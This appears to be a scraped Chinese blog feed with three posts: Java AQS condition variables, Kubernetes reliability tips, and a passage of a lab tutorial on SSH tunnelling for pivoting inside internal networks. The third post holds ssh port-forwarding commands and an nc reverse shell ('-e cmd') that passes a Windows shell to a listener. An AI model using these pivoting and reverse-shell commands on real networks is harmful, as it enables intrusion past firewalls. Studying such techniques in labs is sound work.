&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1368608/202002/1368608-20200201220145350-1764066458.png&quot; alt=&quot;&quot; width=&quot;328&quot; height=&quot;191&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　最后再将t的下一个节点设置为node，下图所示，就ok了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1368608/202002/1368608-20200201220402784-25690426.png&quot; alt=&quot;&quot; width=&quot;349&quot; height=&quot;214&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;二.AQS条件变量的使用&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　什么是条件变量呢？我们在开始介绍AQS的时候，还有一个内部类没有说，就是ConditionObject，还记得前面说过的Unsafe中的park和unpark方法吗？而这个ConditionObject就对这两个方法进行了一次封装，await()和signal()方法，但是更灵活，可以创建多个条件变量，每个条件变量维护一个条件队列（就是一个单向链表，可以看到Node这个内部类中个属性是nextWaiter）；&lt;/p&gt;
&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;注意：每一个条件变量里面都维护了一个条件队列&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　举个例子，如下所示；&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
package&lt;span&gt; com.example.demo.study;

import&lt;span&gt; java.util.concurrent.locks.Condition;
import&lt;span&gt; java.util.concurrent.locks.ReentrantLock;

public class&lt;span&gt; Study0201 {

    public static void main(String[] args) throws&lt;span&gt; InterruptedException {
        // 创建锁对象
        ReentrantLock lock = new&lt;span&gt; ReentrantLock();
        // 创建条件变量
        Condition condition =&lt;span&gt; lock.newCondition();
        // 以下创建两个线程，里面都会获取锁和释放锁
        Thread thread1 = new Thread(() -&amp;gt;&lt;span&gt; {
            lock.lock();
            try&lt;span&gt; {
                System.out.println(&quot;await begin&quot;&lt;span&gt;);
                // 注意，这里调用条件变量的await方法，当前线程就会丢到condition条件变量中的条件队列中阻塞
&lt;span&gt;                condition.await();
                System.out.println(&quot;await end&quot;&lt;span&gt;);
            } catch&lt;span&gt; (InterruptedException e) {
                //
            } finally&lt;span&gt; {
                lock.unlock();
            }

        });

        Thread thread2 = new Thread(() -&amp;gt;&lt;span&gt; {
            lock.lock();
            try&lt;span&gt; {
                System.out.println(&quot;signal begin&quot;&lt;span&gt;);
                // 唤醒被condition变量内部队列中的某个线程
&lt;span&gt;                condition.signal();
                System.out.println(&quot;signal end&quot;&lt;span&gt;);
            } finally&lt;span&gt; {
                lock.unlock();
            }
        });
        thread1.start();
        Thread.sleep(500&lt;span&gt;);
        thread2.start();
    }
}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1368608/202002/1368608-20200202160441928-1060567652.png&quot; alt=&quot;&quot; width=&quot;170&quot; height=&quot;75&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　还可以创建多个条件变量，如下所示，每一个条件变量都维护了一个条件队列：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
package&lt;span&gt; com.example.demo.study;

import&lt;span&gt; java.util.concurrent.locks.Condition;
import&lt;span&gt; java.util.concurrent.locks.ReentrantLock;

public class&lt;span&gt; Study0201 {

    public static void main(String[] args) throws&lt;span&gt; InterruptedException {
        // 创建锁对象
        ReentrantLock lock = new&lt;span&gt; ReentrantLock();
        // 创建条件变量1
        Condition condition1 =&lt;span&gt; lock.newCondition();
        //条件变量2
        Condition condition2 =&lt;span&gt; lock.newCondition();
        
        // 以下创建两个线程，里面都会获取锁和释放锁
        Thread thread1 = new Thread(() -&amp;gt;&lt;span&gt; {
            lock.lock();
            try&lt;span&gt; {
                System.out.println(&quot;await begin&quot;);&lt;strong&gt;//1&lt;/strong&gt;
&lt;span&gt;                condition1.await();
                System.out.println(&quot;await end&quot;);&lt;strong&gt;//5&lt;/strong&gt;
&lt;span&gt;                
                System.out.println(&quot;condition2---signal---start&quot;);&lt;strong&gt;//6&lt;/strong&gt;
&lt;span&gt;                condition2.signal();
                System.out.println(&quot;condition2---signal---endend&quot;);&lt;strong&gt;//7&lt;/strong&gt;
            } catch&lt;span&gt; (InterruptedException e) {
                //
            } finally&lt;span&gt; {
                lock.unlock();
            }

        });

        Thread thread2 = new Thread(() -&amp;gt;&lt;span&gt; {

            lock.lock();
            try&lt;span&gt; {
                System.out.println(&quot;signal begin&quot;);&lt;strong&gt;//2&lt;/strong&gt;
&lt;span&gt;                condition1.signal();
                System.out.println(&quot;signal end&quot;);&lt;strong&gt;//3&lt;/strong&gt;
&lt;span&gt;                
                System.out.println(&quot;condition2---await---start&quot;);&lt;strong&gt;//4&lt;/strong&gt;
&lt;span&gt;                condition2.await();
                System.out.println(&quot;condition2---await---end&quot;);&lt;strong&gt;//8&lt;/strong&gt;
            } catch&lt;span&gt; (InterruptedException e) {
                //
            } finally&lt;span&gt; {
                lock.unlock();
            }

        });

        thread1.start();
        Thread.sleep(500&lt;span&gt;);
        thread2.start();

    }

}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1368608/202002/1368608-20200202161617699-1936909598.png&quot; alt=&quot;&quot; width=&quot;350&quot; height=&quot;174&quot;/&gt;&lt;/p&gt;

&lt;p&gt; &lt;span&gt;&lt;strong&gt;三.走进条件变量&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　我们看看上面的获取条件变量的方式Condition condition1 = lock.newCondition()，我们打开newCondition方法，最后就是创建一个ConditionObject实例；这个类是AQS的内部类，通过这个类可以访问AQS内部的属性和方法；&lt;/p&gt;
&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;注意：在调用await方法和signal方法之前，必须要先获取锁&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1368608/202002/1368608-20200202202621131-1115252999.png&quot; alt=&quot;&quot; width=&quot;363&quot; height=&quot;74&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1368608/202002/1368608-20200202202641400-929712178.png&quot; alt=&quot;&quot; width=&quot;353&quot; height=&quot;75&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　然后我们再看看条件变量的await方法，下图所示，我们可以进入到addConditionWaiter()方法内部看看：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
public final void await() throws&lt;span&gt; InterruptedException {
    if&lt;span&gt; (Thread.interrupted())
        throw new&lt;span&gt; InterruptedException();
    //新建一个Node.CONDITION节点放到条件队列最后面
    Node node =&lt;span&gt; addConditionWaiter();
    //释放当前线程获取的锁
    int savedState =&lt;span&gt; fullyRelease(node);
    int interruptMode = 0&lt;span&gt;;
    //调用park()方法阻塞挂起当前线程
    while (!&lt;span&gt;isOnSyncQueue(node)) {
        LockSupport.park(this&lt;span&gt;);
        if ((interruptMode = checkInterruptWhileWaiting(node)) != 0&lt;span&gt;)
            break&lt;span&gt;;
    }
    if (acquireQueued(node, savedState) &amp;amp;&amp;amp; interruptMode !=&lt;span&gt; THROW_IE)
        interruptMode =&lt;span&gt; REINTERRUPT;
    if (node.nextWaiter != null) // clean up if cancelled
&lt;span&gt;        unlinkCancelledWaiters();
    if (interruptMode != 0&lt;span&gt;)
        reportInterruptAfterWait(interruptMode);
}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
private&lt;span&gt; Node addConditionWaiter() {
    Node t =&lt;span&gt; lastWaiter;
    //第一次进来，这个lastWaiter是null，即t = null,不会进入到这个if语句
    if (t != null &amp;amp;&amp;amp; t.waitStatus !=&lt;span&gt; Node.CONDITION) {
        unlinkCancelledWaiters();
        t =&lt;span&gt; lastWaiter;
    }
    //创建一个Node.CONDITION类型的节点，然后下面这个if中就是将第一个节点firstWaiter和最后一个节点都指向这个新创建的节点
    Node node = new&lt;span&gt; Node(Thread.currentThread(), Node.CONDITION);
    if (t == null&lt;span&gt;)
        firstWaiter =&lt;span&gt; node;
    else&lt;span&gt;
        t.nextWaiter =&lt;span&gt; node;
    lastWaiter =&lt;span&gt; node;
    return&lt;span&gt; node;
}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　顺便在看看signal方法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
public final void&lt;span&gt; signal() {
    if (!&lt;span&gt;isHeldExclusively())
        throw new&lt;span&gt; IllegalMonitorStateException();
    //条件队列移除第一个节点，然后把这个节点丢到阻塞队列中，然后激活这个线程
    Node first =&lt;span&gt; firstWaiter;
    if (first != null&lt;span&gt;)
        doSignal(first);
}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1368608/202002/1368608-20200202204618554-1281259136.png&quot; alt=&quot;&quot; width=&quot;483&quot; height=&quot;163&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1368608/202002/1368608-20200202210306088-416702660.png&quot; alt=&quot;&quot; width=&quot;483&quot; height=&quot;301&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　我们想一想在AQS中阻塞队列和条件队列有什么关系啊？&lt;/p&gt;
&lt;p&gt;　　1.当多个线程调用lock.lock()方法的时候，只有一个线程获取到可锁，其他的线程都会被转为Node节点丢到AQS的阻塞队列中，并做CAS自旋获取锁；&lt;/p&gt;
&lt;p&gt;　　2.当获取到锁的线程对应的条件变量的await()方法被调用的时候，该线程就会释放锁，并把当前线程转为Node节点放到条件变量对应的条件队列中；&lt;/p&gt;
&lt;p&gt;　　3.这个时候AQS的阻塞队列中又会有一个节点中的线程能得到锁了，如果这个线程又恰巧调用了对应条件变量的await()方法时，又会重复2的步骤，然后阻塞队列中又会有一个节点中的线程获得锁&lt;/p&gt;
&lt;p&gt;　　4.然后，又有一个线程调用了条件变量的signal()或者signalAll()方法，就会把条件队列中一个或者所有的节点都移动到AQS阻塞队列中，然后调用unpark方法进行授权，就等着获得锁了；&lt;/p&gt;
&lt;p&gt;　　一个锁对应一个阻塞队列，但是对应多个条件变量，每一个条件变量对应一个条件队列；其中，这两种队列中存放的都是Node节点，Node节点中封装了线程及其状态，下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1368608/202002/1368608-20200202210854168-669790023.png&quot; alt=&quot;&quot; width=&quot;448&quot; height=&quot;251&quot;/&gt;&lt;/p&gt;

</description>
<pubDate>Sun, 02 Feb 2020 13:23:00 +0000</pubDate>
<dc:creator>java小新人</dc:creator>
<og:description>上一篇简单介绍了AQS，我们大概知道AQS就是一个框架，把很多功能都给实现了（比如入队规则，唤醒节点中的线程等），我们如果要使用的话只需要实现其中的一些方法（比如tryAcquire等）就行了！这次主</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/wyq1995/p/12253792.html</dc:identifier>
</item>
<item>
<title>K8S生产环境中实践高可靠的配置和技巧都有哪些？ - PassZhang</title>
<link>http://www.cnblogs.com/passzhang/p/12253698.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/passzhang/p/12253698.html</guid>
<description>&lt;h2 id=&quot;k8s环境中实践高可靠的配置和技巧都有哪些&quot;&gt;K8S环境中实践高可靠的配置和技巧都有哪些？&lt;/h2&gt;
&lt;h3 id=&quot;磁盘类型及大小&quot;&gt;磁盘类型及大小&lt;/h3&gt;
&lt;p&gt;磁盘类型：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;推荐使用ssd 磁盘&lt;/li&gt;
&lt;li&gt;对于worker节点，创建集群时推荐使用挂载数据盘。这个盘是专门给/var/lib/docker 存放本地镜像。可以避免后续因镜像太多而造成磁盘根目录容量不够的情况。在运行一段时间后，本地会存在很多无用的镜像。比较快捷的方式就是，先下线这台机器，重新构建这个磁盘，然后再上线。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;磁盘大小：&lt;br/&gt;kubernetes节点需要的磁盘空间也不小，Docker镜像、系统日志、应用日志都保存在磁盘上。创建kubernetes集群的时候，要考虑每个节点上要部署的pod数量，每个pod的日志大小、镜像大小、临时数据，再加上系统预留的值。&lt;br/&gt;kubernetes集群中操作系统占用3G左右的磁盘空间，建议预留8G左右的磁盘空间。剩余空间考虑到给kubernetes资源对象使用。&lt;/p&gt;
&lt;h3 id=&quot;是否立即构建worker节点&quot;&gt;是否立即构建worker节点&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;构建节点考虑初始节点数量和后续增加的节点和证书问题。&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;网络选择&quot;&gt;网络选择&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;如果需要连接外部的一些服务，如rds等，则需要考虑复用原有的VPC，而不是创建一个新的VPC。因为VPC间是隔离的，您可以创建一个新的交换机，把kubernetes的机器都放在这个交换机网络下，从而便于管理。&lt;/li&gt;
&lt;li&gt;在kubernetes集群创建时，需要选定好网络插件，后续如果需要更新网络插件，或多或少都会对生产业务造成一定影响。当前主流的网络插件有：calico、flannel和terway(阿里云)&lt;/li&gt;
&lt;li&gt;pod网络cidr不能设置太小，如果太小，可以支持的节点数量就会受限。这个值的设置需要和pod节点数量综合考虑。例如：pod网络cidr的网段是/16，那么就会256*256个地址，如果每个节点数量是128，则最多可以支持512个节点。&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;使用多可用区&quot;&gt;使用多可用区&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;阿里云支持多地域，每个地域下面又有不同的可用区。可用区是指在同一个地域内，店里和网络互相地理的物理区域。多可用区能够实现跨区域的容灾能力。同时也会带来额外的网络时延。创建kubernetes集群时，您可以选择创建多可用区kubernetes集群。其实对于裸机部署来讲，跨机房网络只要3层可达既可以。&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;声明每个pod的resource&quot;&gt;声明每个pod的resource&lt;/h3&gt;
&lt;p&gt;在使用kubernetes集群时，经常会遇到：在一个节点上调度了太多的pod，导致节点负载太高，没法正常对外提供服务的问题。&lt;br/&gt;为避免上述问题，在kubernetes中部署pod时，您可以指定pod需要的request及limit的资源，kubernetes在部署这个pod时，就会根据pod的需求找到一个具有充足空闲资源的节点部署这个pod。下面例子中就声明了nginx这个pod需要1核CPU，1024M内存，运行实际应用不能超过2核CPU和4096MB内存。&lt;br/&gt;&lt;code&gt;apiVersion: v1 kind: Pod metadata: name: nginx spec: containers: - name: nginx image: nginx resources: # 资源声明 requests: memory: &quot;1024Mi&quot; cpu: &quot;1000m&quot; limits: memory: &quot;4096Mi&quot; cpu: &quot;2000m&quot;&lt;/code&gt;&lt;br/&gt;kubernetes采用静态资源调度方式，对于每个节点上的剩余资源，是这样计算的：节点剩余资源=节点总资源-已经分配出去的资源，并不是实际使用的资源。如果您自己手动裕兴一个很耗资源的程序，kubernetes并不能感知到。&lt;br/&gt;另外所有的pod上都要声明resource。对于没有声明resource的pod，它被调度到某个节点后，kubernetes也不会在对应的节点上扣掉这个pod使用的资源。可能会导致节点上调度过去的太多的pod。&lt;/p&gt;
&lt;h3 id=&quot;日志和监控方向&quot;&gt;日志和监控方向&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;需要提前测试好是否配置elkF集群来实现日志的监控，实现之后对于每个pod的日志的存储和采集，需要提前配置(包括动态新增pod和动态新增节点时是否能够自动采集日志和存储日志)。&lt;/li&gt;
&lt;li&gt;需要提前测试prometheus监控和grafana图形展示(动态新增pod节点监控和node监控)。&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;启动时等待下游服务不要直接退出&quot;&gt;启动时等待下游服务，不要直接退出&lt;/h3&gt;
&lt;p&gt;游戏应用可能会有一些外部依赖，例如需要从数据库(DB)读取数据或者依赖另一个服务的接口。应用启动的时候，外部依赖尾部都能满足。手工运维的时候，通常采用依赖不满足立即退出的方式，也就是所谓的failfast，但是在kubernetes中，这种策略不再适用。原因在于kubernetes中多数运维操作是自动的，不需要人工接入，例如部署应用，您不用自己选择节点，再到节点上启动应用，应用fail，不用手动重启，kubernetes会自动重启应用。负载增高，还可以通过HPA自动扩容。&lt;br/&gt;针对启动时依赖不满足这个场景，假设有两个应用A和B，A依赖B，对A来说就是依赖不满足。如果A还是按照传统的方式直接退出，当B启动之后，A也不会再启动，必须人工介入处理才行。&lt;br/&gt;kubernetes的最好的方式就是启动时检查依赖，如果不满足，轮训等待，而不是直接退出。可以通过Init Container(&lt;a href=&quot;https://kubernetes.io/docs/concepts/workloads/pods/init-containers/?spm=a2c63.p38356.879954.9.79896be3WGvb05#what-can-init-containers-be-used-for)%E5%AE%8C%E6%88%90%E8%BF%99%E4%B8%AA%E5%8A%9F%E8%83%BD&quot; class=&quot;uri&quot;&gt;https://kubernetes.io/docs/concepts/workloads/pods/init-containers/?spm=a2c63.p38356.879954.9.79896be3WGvb05#what-can-init-containers-be-used-for)完成这个功能&lt;/a&gt;。&lt;/p&gt;
&lt;h3 id=&quot;配置restart-policy&quot;&gt;配置restart policy&lt;/h3&gt;
&lt;p&gt;pod运行过程中进程退出是个很常见的问题，无论是代码里面的一个BUG，还是占用内存还多，都会导致应用进程退出，pod退出。您可以在pod上配置restart Policy，都能实现pod挂掉之后在自动重启。&lt;br/&gt;&lt;code&gt;apiVersion: v1 kind: Pod metadata: name: tomcat spec: containers: - name: tomcat image: tomcat restartPolicy: OnFailure #&lt;/code&gt;&lt;br/&gt;restart Policy有三个可选值&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Always：总是自动重启&lt;/li&gt;
&lt;li&gt;OnFailure：异常退出才自动重启(进程退出状态非0)&lt;/li&gt;
&lt;li&gt;Never：从不重启&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;配置liveness-probe和readiness-probe&quot;&gt;配置Liveness Probe和Readiness Probe&lt;/h3&gt;
&lt;p&gt;Pod处于running状态和pod能正常提供服务是完全不同的概念，一个running状态的pod，里面的进程可能发生了死锁而无法提供服务。但是因为pod还是running的，kubernetes也不会自动重启这个pod。所有我们要在所有pod上配置liveness probe，探测pod是否真的存活，是否还能提供服务。如果liveness probe发现了问题，kubernetes会自动重启pod。&lt;br/&gt;readiness probe 用于探测pod是不是可以对外提供服务。应用启动过程中需要一些时间完成初始化，在这个过程中是没法对外提供服务的，通过readiness probe，可以告诉ingress 或者service能不能把流量继续转发到这个pod上，当pod出现问题的时候，readiness probe能够避免新流量继续转发给这个pod。&lt;br/&gt;&lt;code&gt;apiVersion: v1 kind: Pod metadata: name: tomcat spec: containers: - name: tomcat image: tomcat livenessProbe: httpGet: path: /index.jsp port: 8080 initialDelaySeconds: 3 periodSeconds: 3 readinessProbe: httpGet: path: /index.jsp port: 8080&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;每个进程一个容器&quot;&gt;每个进程一个容器&lt;/h3&gt;
&lt;p&gt;很多刚刚接触容器的人按照旧习惯把容器当做虚拟机(VM)使用，在一个容器里面放置多个进程：监控进程、日志进程、sshd进程、甚至整个systemd。这样操作存在两个问题：&lt;br/&gt;- 判断pod整体的资源占用会变复杂，不方便实施前面提到resource limit。&lt;br/&gt;- 容器内只有一个进程的情况，进程挂了，外面的容器引擎可以清楚的感知到，然后重启容器。如果容器内有多个进程，某个进程挂了，容器未必受影响，外部的容器引擎感知不到容器内有进程退出，也不会对容器做任何的操作，但是实际上容器已经不能正常工作了。&lt;br/&gt;如果有好几个进程需要进行协同工作，在kubernetes里也可以实现，例如nginx和php-fpm，通过unix domain socket通信，我们可以用一个包含两个容器的pod，unix socker放在两个容器的共享volume中。&lt;/p&gt;
&lt;h3 id=&quot;确保不存在spofsingle-point-of-failure&quot;&gt;确保不存在SPOF(Single Point of Failure)&lt;/h3&gt;
&lt;p&gt;如果应用只有一个示例，当实例失败的时候，虽然kubernetes能够重启实例，但是中间不可避免的存在一段时间的不可用。甚至更新应用，发布一个新版本的时候，也会出现这种情况。在kubernetes里，尽量避免直接使用pod，尽可能的使用deployment/Statefulset,并且让应用至少有两个pod以上。&lt;/p&gt;
</description>
<pubDate>Sun, 02 Feb 2020 13:05:00 +0000</pubDate>
<dc:creator>PassZhang</dc:creator>
<og:description>K8S环境中实践高可靠的配置和技巧都有哪些？ 磁盘类型及大小 磁盘类型： 推荐使用ssd 磁盘 对于worker节点，创建集群时推荐使用挂载数据盘。这个盘是专门给/var/lib/docker 存放本</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/passzhang/p/12253698.html</dc:identifier>
</item>
<item>
<title> ssh隧道使用 - Micr067</title>
<link>http://www.cnblogs.com/micr067/p/12253615.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/micr067/p/12253615.html</guid>
<description>&lt;p&gt;在内网中几乎所有的linux服务器和网络设备都支持ssh协议。一般情况下，ssh协议是允许通过防火墙和边界设备的，所以经常被攻击者利用。同时ssh协议的传输过程是加密的，所以我们很难区分合法的ssh会话和攻击者利用其他网络建立的隧道。攻击者使用ssh端口隧道突破防火墙的限制后，能够建立一些之前无法建立的TCP连接。&lt;/p&gt;
&lt;p&gt;一个普通的ssh命令如下：&lt;/p&gt;

&lt;p&gt;创建ssh隧道的常用参数如下：&lt;/p&gt;
&lt;p&gt;-C：压缩传输，提高传输速度&lt;/p&gt;
&lt;p&gt;-f ：将ssh传输转入后台执行，不占用当前的shell。&lt;/p&gt;
&lt;p&gt;-N：建立静默连接（建立了连接，但是看不到具体的会话）&lt;/p&gt;
&lt;p&gt;-g 允许远程主机连接本地用于转发的端口。&lt;/p&gt;
&lt;p&gt;-L：本地端口转发&lt;/p&gt;
&lt;p&gt;-R：远程端口转发&lt;/p&gt;
&lt;p&gt;-D：动态转发（socks代理）&lt;/p&gt;
&lt;p&gt;-P：指定ssh端口。&lt;/p&gt;

&lt;p&gt;1.本地端口转发&lt;/p&gt;
&lt;p&gt;测试环境如下：&lt;/p&gt;
&lt;p&gt;外部vps可以访问内网web服务器，但是不能访问数据库服务器，内网web服务器可以和数据库服务器互相访问。&lt;/p&gt;
&lt;p&gt;测试目标：以web服务器为跳板，访问数据库服务器的3389端口。&lt;/p&gt;
&lt;div&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/88D1BB31162B4F258526742FDC670AFD/80389&quot; alt=&quot;&quot; data-media-type=&quot;image&quot; data-original=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/88D1BB31162B4F258526742FDC670AFD/80389&quot;/&gt;&lt;/div&gt;
&lt;p&gt;修改ssh服务器配置文件&lt;/p&gt;
&lt;p&gt;/etc/ssh/sshd_config&lt;/p&gt;
&lt;p&gt;– PermitRootLogin yes&lt;/p&gt;
&lt;p&gt;– Port 22&lt;/p&gt;
&lt;p&gt;– PasswordAuthentication yes&lt;/p&gt;
&lt;p&gt;▪ service ssh restart&lt;/p&gt;

&lt;p&gt;ssh -fCNg -L &amp;lt;listen port&amp;gt;:&amp;lt;remote ip&amp;gt;:&amp;lt;remote port&amp;gt; user@&amp;lt;ssh server&amp;gt; -p &amp;lt;ssh server port&amp;gt;&lt;/p&gt;
&lt;p&gt;ssh -fCNg -L 1153(vps端口):192.168.190.136(目标主机):3389(目标端口) root@192.168.174.133(跳板机)&lt;/p&gt;
&lt;p&gt;ssh -fCNg -L 1153:192.168.190.136:3389 root@192.168.174.133 -p 22&lt;/p&gt;
&lt;p&gt;netstat -anptl | grep 1153 查看本地1153端口，可以看到1153端口已经开启侦听。&lt;/p&gt;
&lt;div&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/8503D6D2C77F41E2AA9324BE1F9C7201/80373&quot; alt=&quot;&quot; data-media-type=&quot;image&quot; data-original=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/8503D6D2C77F41E2AA9324BE1F9C7201/80373&quot;/&gt;&lt;/div&gt;
&lt;p&gt;使用rdesktop连接vps的1153端口，可以发现已经与数据服务器192.168.190.136的3389建立了连接&lt;/p&gt;
&lt;p&gt;rdesktop 127.0.0.1:1153&lt;/p&gt;
&lt;div&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/B83352A0B593469FBCF81245CC9059BF/80349&quot; alt=&quot;&quot; data-media-type=&quot;image&quot; data-original=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/B83352A0B593469FBCF81245CC9059BF/80349&quot;/&gt;&lt;/div&gt;
&lt;p&gt;ssh进程的本地端口映射可以将本地（客户机）的某个端口转发到远端指定机器的指定端口；本地端口转发则是在本地（客户机）监听一个端口，所有访问这个端口的数据都会通过ssh隧道传输到远端的对应端口。&lt;/p&gt;

&lt;p&gt;加密传输：&lt;/p&gt;
&lt;p&gt;linux1 ： 192.168.190.110&lt;/p&gt;
&lt;p&gt;linux2： 192.168.190.133&lt;/p&gt;
&lt;p&gt;win7： 192.168.190.136&lt;/p&gt;
&lt;p&gt;win2008: 192.168.190.132&lt;/p&gt;
&lt;p&gt;在linux1和linux之间建立一条ssh隐秘隧道，使win2008将自己的shell通过ssh隧道反弹给win7。&lt;/p&gt;
&lt;p&gt;在linux1上执行如下命令：&lt;/p&gt;
&lt;p&gt;ssh -fCNg -L 7006:192.168.190.136:333 root@192.168.190.133 -p 22&lt;/p&gt;
&lt;div&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/18BDF7727DFE42D29DBF1F500CBA347A/80376&quot; alt=&quot;&quot; data-media-type=&quot;image&quot; data-original=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/18BDF7727DFE42D29DBF1F500CBA347A/80376&quot;/&gt;&lt;/div&gt;
&lt;p&gt;在win7上使用nc监听本地333端口&lt;/p&gt;
&lt;p&gt;nc -lvp 333&lt;/p&gt;
&lt;p&gt;在win ser2008上使用nc连接linux1的7006端口&lt;/p&gt;
&lt;p&gt;nc.exe 192.168.190.110 7006 -e cmd&lt;/p&gt;
&lt;p&gt;回到win7上可以看到已经获得了win2008的shell了。&lt;/p&gt;
&lt;div&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/7E63404D92B64CE1B34C873C22035E25/80385&quot; alt=&quot;&quot; data-media-type=&quot;image&quot; data-original=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/7E63404D92B64CE1B34C873C22035E25/80385&quot;/&gt;&lt;/div&gt;

&lt;p&gt;2.远程端口转发&lt;/p&gt;
&lt;p&gt;测试环境如下：&lt;/p&gt;
&lt;p&gt;左侧为攻击者vps（kali linux）；右侧是一个小型内网，包含三台机器；内网没有边界设备，所以外部的vps不能访问内网中的三台机器；内网web服务器可以访问外网vps，数据库服务器和域控服务器均不能访问外网的vps。&lt;/p&gt;
&lt;p&gt;测试目标：通过外网vps访问数据库服务器的3389端口。&lt;/p&gt;
&lt;div&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/EA5CDC1D73314E7E9A2F8A1330C4D8F8/80404&quot; alt=&quot;&quot; data-media-type=&quot;image&quot; data-original=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/EA5CDC1D73314E7E9A2F8A1330C4D8F8/80404&quot;/&gt;&lt;/div&gt;
&lt;p&gt;以web服务器为跳板，将vps的1521端口的流量转发到数据库服务器的3389端口，然后访问vps的1521端口，就可以访问数据库服务器192.168.190.136的3389端口了。&lt;/p&gt;
